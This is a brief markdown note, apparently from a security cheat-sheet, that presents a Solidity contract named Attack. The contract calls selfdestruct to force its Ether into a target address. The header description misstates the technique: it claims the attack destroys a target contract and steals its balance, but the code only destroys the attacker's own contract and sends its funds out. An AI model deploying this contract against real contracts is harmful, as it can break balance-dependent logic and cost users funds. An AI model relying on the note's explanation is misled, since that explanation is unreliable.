---
title: Solidity Self Destruct Attack
description: Solidity’s ‘selfdestruct’ function may be used to destruct a target contract and steal the balance by an attacker.
tags:
    - Blockchain
    - Ethereum
refs:
date: 2023-09-30
draft: false
---

## Create a Malicious Contract for Destructing Contract

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.4.0;

contract Attack {
    function attack(address _address) payable public {
        // the remaining Ether sent to _address when destructing
        selfdestruct(_address);
    }
}
```
